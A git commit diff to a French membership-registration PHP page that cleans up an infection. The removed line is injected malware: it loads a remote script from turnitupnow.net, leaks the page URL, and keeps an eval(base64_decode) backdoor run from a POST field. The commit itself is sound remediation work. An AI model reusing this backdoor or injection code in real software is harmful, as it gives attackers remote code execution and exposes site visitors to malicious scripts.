227feb4aff0013435f755af98cdb61d899ac27bd
Jonathan <jbreton@kronostechnologies.com>
2012-04-11 21:10:24 -0400

    Nettoyage de tout ce qui semble étrange

--- membrereg/process2.php
+++ membrereg/process2.php
@@ -71,8 +71,7 @@ body,td,th {
       <tr class="block_centre">
         <td width="125" valign="top" class="leftnav">    <!-- InstanceBeginEditable name="TexteGauche" --><!-- InstanceEndEditable --></td>
         <td width="642" class="block_centre"><!-- InstanceBeginEditable name="centre" -->
-          <?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }
-
+          <?php	
     include("global.inc.php");
     $errors=0;
     $error="Les erreurs suivantes se sont produites en traitant votre inscription.<ul>";
